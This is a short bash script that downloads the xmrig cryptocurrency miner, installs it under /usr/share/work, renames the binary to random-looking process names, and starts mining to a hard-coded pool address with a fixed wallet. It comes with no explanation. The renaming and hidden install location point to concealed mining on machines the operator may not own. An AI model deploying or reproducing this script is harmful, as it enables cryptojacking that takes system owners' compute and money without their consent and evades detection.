#!/bin/bash
VERSION=4.6.2-beta
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget screen
mkdir /usr/share
mkdir /usr/share/work
rm -r /usr/share/work/xmrig-$VERSION
wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-xenial-x64.tar.gz
mv xmrig-$VERSION-xenial-x64.tar.gz /usr/share/work/
cd /usr/share/work/ &&  tar -xvzf xmrig-$VERSION-xenial-x64.tar.gz
rm -rf xmrig-$VERSION-xenial-x64.tar.gz && cd xmrig-$VERSION
mv xmrig $azure -n
cp $azure "$cpuname"
rm -f  xmrig
POOL=158.101.11.171:3333
USERNAME=LQhoRFjHmsAjLa64TZjMPaAf6DUBnzETBbnasnb5gxDSCp1guVSfmPJ19ms57g3xMCZpwjhf5PM34FrcjPaEuthv3jnpABV
THREADS=4
echo $cpuname" is starting"
./"${cpuname}" --donate-level 1 -o $POOL -u $USERNAME -p x -a rx/loki -k t $THREADS
